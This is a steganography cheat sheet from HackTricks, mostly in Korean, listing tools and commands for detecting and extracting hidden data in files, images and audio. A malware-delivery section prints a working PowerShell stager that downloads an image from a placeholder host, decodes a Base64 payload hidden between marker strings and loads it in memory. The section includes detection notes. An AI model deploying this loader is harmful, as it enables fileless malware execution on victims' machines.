# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **파일에서 데이터 추출**

### **Binwalk**

바이너리 파일에서 내장된 숨겨진 파일과 데이터를 검색하는 도구입니다. `apt`로 설치할 수 있으며 소스는 [GitHub](https://github.com/ReFirmLabs/binwalk)에서 확인할 수 있습니다.
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

파일의 헤더와 푸터를 기반으로 파일을 복구합니다. png 이미지에 유용합니다. `apt`로 설치되며 소스는 [GitHub](https://github.com/korczis/foremost)에 있습니다.
```bash
foremost -i file # Extracts data
```
### **Exiftool**

파일 메타데이터를 확인하는 데 도움이 되며, [here](https://www.sno.phy.queensu.ca/~phil/exiftool/)에서 사용할 수 있습니다.
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

exiftool과 유사하며 메타데이터를 조회하기 위한 도구입니다. `apt`로 설치할 수 있으며, 소스는 [GitHub](https://github.com/Exiv2/exiv2)에 있고 [official website](http://www.exiv2.org/)가 있습니다.
```bash
exiv2 file # Shows the metadata
```
### **파일**

다루고 있는 파일의 유형을 식별하세요.

### **문자열**

다양한 인코딩 설정을 사용해 출력물을 필터링하면서 파일에서 읽을 수 있는 문자열을 추출합니다.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **비교 (cmp)**

수정된 파일을 온라인에서 찾은 원본 버전과 비교하는 데 유용합니다.
```bash
cmp original.jpg stego.jpg -b -l
```
## **텍스트에서 숨겨진 데이터 추출**

### **공백에 숨겨진 데이터**

겉보기엔 비어 있는 공백에 보이지 않는 문자들이 정보를 숨길 수 있습니다. 이 데이터를 추출하려면 [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder)를 방문하세요.

## **이미지에서 데이터 추출**

### **GraphicMagick으로 이미지 세부 정보 확인**

[GraphicMagick](https://imagemagick.org/script/download.php)는 이미지 파일 형식을 판단하고 손상 여부를 식별하는 데 사용됩니다. 이미지를 검사하려면 아래 명령을 실행하세요:
```bash
./magick identify -verbose stego.jpg
```
손상된 이미지를 복구하려 시도할 때, 메타데이터 코멘트를 추가하는 것이 도움이 될 수 있습니다:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **데이터 은닉을 위한 Steghide**

Steghide는 `JPEG, BMP, WAV, and AU` 파일 내에 데이터를 숨기는 것을 지원하며, 암호화된 데이터를 삽입하고 추출할 수 있습니다. 설치는 `apt`로 간단하며 [소스 코드는 GitHub에서 확인할 수 있습니다](https://github.com/StefanoDeVuono/steghide).

**명령:**

- `steghide info file`는 파일에 숨겨진 데이터가 있는지 확인합니다.
- `steghide extract -sf file [--passphrase password]`는 숨겨진 데이터를 추출합니다(비밀번호는 선택 사항).

웹 기반 추출은 [이 웹사이트](https://futureboy.us/stegano/decinput.html)를 방문하세요.

**Stegcracker를 이용한 무차별 대입 공격:**

- Steghide의 비밀번호 크래킹을 시도하려면, 다음과 같이 [stegcracker](https://github.com/Paradoxis/StegCracker.git)를 사용하세요:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg — PNG 및 BMP 파일용**

zsteg는 PNG 및 BMP 파일에 숨겨진 데이터를 찾아내는 데 특화되어 있습니다. 설치는 `gem install zsteg`로 수행하며, [source on GitHub](https://github.com/zed-0xff/zsteg)를 참조하세요.

**명령어:**

- `zsteg -a file` 파일에 모든 탐지 방법을 적용합니다.
- `zsteg -E file` 데이터 추출을 위한 페이로드를 지정합니다.

### **StegoVeritas 및 Stegsolve**

**stegoVeritas**는 메타데이터를 검사하고, 이미지 변환을 수행하며, LSB brute forcing 등을 포함한 기능을 제공합니다. 전체 옵션 목록은 `stegoveritas.py -h`를 사용하고, 모든 검사를 실행하려면 `stegoveritas.py stego.jpg`를 사용하세요.

**Stegsolve**는 이미지 내 숨겨진 텍스트나 메시지를 드러내기 위해 다양한 색상 필터를 적용합니다. [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve)에서 이용할 수 있습니다.

### **FFT를 이용한 숨겨진 콘텐츠 탐지**

Fast Fourier Transform (FFT) 기술은 이미지에 숨겨진 콘텐츠를 드러낼 수 있습니다. 유용한 리소스:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy — 오디오 및 이미지 파일용**

Stegpy는 PNG, BMP, GIF, WebP, WAV와 같은 형식을 포함해 이미지 및 오디오 파일에 정보를 삽입할 수 있습니다. [GitHub](https://github.com/dhsdshdhk/stegpy)에서 이용할 수 있습니다.

### **Pngcheck — PNG 파일 분석용**

PNG 파일을 분석하거나 진위를 확인하려면 다음을 사용하세요:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **이미지 분석을 위한 추가 도구**

For further exploration, consider visiting:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## 마커로 구분된 Base64 payloads가 이미지 안에 숨겨짐 (malware delivery)

Commodity loaders는 점점 유효한 이미지(종종 GIF/PNG) 내부의 일반 텍스트로 Base64-encoded payloads를 숨깁니다. 픽셀 수준의 LSB 대신, payload는 파일의 텍스트/메타데이터에 삽입된 고유한 시작/종료 마커 문자열로 구분됩니다. 그 후 PowerShell stager는:

- HTTP(S)를 통해 이미지를 다운로드함
- 마커 문자열을 찾음 (관찰된 예: <<sudo_png>> … <<sudo_odt>>)
- 내부 텍스트를 추출한 뒤 Base64로 디코딩해 바이트로 변환함
- 메모리 내에서 .NET assembly를 로드하고 알려진 entry method를 호출함 (디스크에 파일을 쓰지 않음)

간단한 PowerShell carving/loading 스니펫
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Notes
- This falls under ATT&CK T1027.003 (steganography). Marker strings vary between campaigns.
- Hunting: scan downloaded images for known delimiters; flag `PowerShell` using `DownloadString` followed by `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **오디오에서 데이터 추출**

**Audio steganography**는 사운드 파일 내에 정보를 은닉하는 고유한 방법을 제공합니다. 숨겨진 콘텐츠를 삽입하거나 검색하기 위해 다양한 도구가 사용됩니다.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide는 JPEG, BMP, WAV 및 AU 파일에 데이터를 숨기도록 설계된 다목적 도구입니다. 자세한 지침은 [stego tricks documentation](stego-tricks.md#steghide)에 제공되어 있습니다.

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

이 도구는 PNG, BMP, GIF, WebP 및 WAV 등 다양한 형식을 지원합니다. 자세한 내용은 [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav)를 참조하세요.

### **ffmpeg**

ffmpeg는 오디오 파일의 무결성을 평가하고 세부 정보를 확인하며 불일치를 식별하는 데 필수적입니다.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg는 WAV 파일 내부에 데이터를 숨기고 추출하는 데 있어 최하위 비트(least significant bit, LSB) 방식을 사용하여 뛰어납니다. [GitHub](https://github.com/ragibson/Steganography#WavSteg)에서 확인할 수 있습니다. 명령어 예:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound는 AES-256을 사용하여 오디오 파일 내 정보의 암호화 및 검출을 가능하게 합니다. [the official page](http://jpinsoft.net/deepsound/download.aspx)에서 다운로드할 수 있습니다.

### **Sonic Visualizer**

오디오 파일의 시각적·분석적 검사를 위한 매우 유용한 도구로, Sonic Visualizer는 다른 방법으로는 감지할 수 없는 숨겨진 요소를 드러낼 수 있습니다. 자세한 내용은 [official website](https://www.sonicvisualiser.org/)를 방문하세요.

### **DTMF Tones - Dial Tones**

오디오 파일에서 DTMF 톤을 탐지하려면 [this DTMF detector](https://unframework.github.io/dtmf-detect/)나 [DialABC](http://dialabc.com/sound/detect/index.html)와 같은 온라인 도구를 사용할 수 있습니다.

## **기타 기법**

### **Binary Length SQRT - QR Code**

길이의 제곱근이 정수인 이진 데이터는 QR 코드일 수 있습니다. 확인하려면 다음 스니펫을 사용하세요:
```python
import math
math.sqrt(2500) #50
```
바이너리를 이미지로 변환하려면 [dcode](https://www.dcode.fr/binary-image)를 확인하세요. QR 코드를 읽으려면 [this online barcode reader](https://online-barcode-reader.inliteresearch.com/)를 사용하세요.

### **점자 번역**

점자를 번역하려면 [Branah Braille Translator](https://www.branah.com/braille-translator)가 훌륭한 자료입니다.

## **참고자료**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
